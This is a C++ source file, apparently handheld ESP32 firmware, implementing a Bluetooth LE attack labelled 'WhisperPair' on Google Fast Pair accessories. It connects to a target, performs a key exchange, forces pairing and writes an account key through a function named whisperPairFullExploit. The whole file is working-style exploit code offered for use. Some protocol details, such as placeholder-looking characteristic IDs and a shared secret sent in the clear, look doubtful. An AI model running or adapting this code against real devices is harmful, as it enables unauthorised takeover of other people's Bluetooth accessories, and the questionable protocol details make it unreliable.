#include "whisperpair.h"
#include "fastpair_crypto.h"
#include <globals.h>
#include "core/display.h"
#include <BLEDevice.h>
#include <BLEClient.h>
#include <BLEUtils.h>

FastPairCrypto crypto;

bool fastpair_ecdh_key_exchange(BLEAddress target, uint8_t* shared_secret) {
    displayMessage("Connecting...", "", "", "", TFT_WHITE);
    BLEClient* pClient = BLEDevice::createClient();
    if(!pClient->connect(target)) {
        displayMessage("Connect failed", "", "", "", TFT_RED);
        return false;
    }
    BLERemoteService* pService = pClient->getService(BLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        displayMessage("No FastPair service", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    BLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(BLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        displayMessage("No KBP char", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    displayMessage("Generating key...", "", "", "", TFT_WHITE);
    uint8_t our_pubkey[65];
    size_t pub_len = 65;
    if(!crypto.generateKeyPair(our_pubkey, &pub_len)) {
        displayMessage("Key gen failed", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    uint8_t keyExchangeMsg[67] = {0};
    keyExchangeMsg[0] = 0x00;
    keyExchangeMsg[1] = 0x20;
    memcpy(&keyExchangeMsg[2], our_pubkey, 65);
    displayMessage("Sending key...", "", "", "", TFT_WHITE);
    if(!pKeyChar->writeValue(keyExchangeMsg, 67, false)) {
        displayMessage("Send failed", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    delay(100);
    displayMessage("Waiting response...", "", "", "", TFT_WHITE);
    std::string response = pKeyChar->readValue();
    if(response.length() < 67) {
        displayMessage("Bad response", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    const uint8_t* their_pubkey = (const uint8_t*)response.c_str() + 2;
    if(!crypto.computeSharedSecret(their_pubkey, 65)) {
        displayMessage("Shared secret failed", "", "", "", TFT_RED);
        pClient->disconnect();
        return false;
    }
    memcpy(shared_secret, crypto.getSharedSecret(), 32);
    pClient->disconnect();
    return true;
}

bool fastpair_complete_pairing(BLEAddress target, const uint8_t* shared_secret) {
    BLEClient* pClient = BLEDevice::createClient();
    if(!pClient->connect(target)) return false;
    BLERemoteService* pService = pClient->getService(BLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        return false;
    }
    BLERemoteCharacteristic* pKeyChar = pService->getCharacteristic(BLEUUID((uint16_t)0x1234));
    if(!pKeyChar) {
        pClient->disconnect();
        return false;
    }
    uint8_t nonce[16];
    esp_fill_random(nonce, 16);
    uint8_t pairingData[50] = {0};
    pairingData[0] = 0x00;
    pairingData[1] = 0x30;
    memcpy(&pairingData[2], nonce, 16);
    memcpy(&pairingData[18], shared_secret, 16);
    if(!pKeyChar->writeValue(pairingData, 34, false)) {
        pClient->disconnect();
        return false;
    }
    delay(100);
    BLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(BLEUUID((uint16_t)0x1236));
    if(pAccountChar) {
        crypto.generateAccountKey();
        pAccountChar->writeValue(crypto.getAccountKey(), 16, true);
    }
    pClient->disconnect();
    return true;
}

bool whisperPairFullExploit(BLEAddress target) {
    uint8_t shared_secret[32];
    if(!fastpair_ecdh_key_exchange(target, shared_secret)) return false;
    if(!fastpair_complete_pairing(target, shared_secret)) return false;
    return true;
}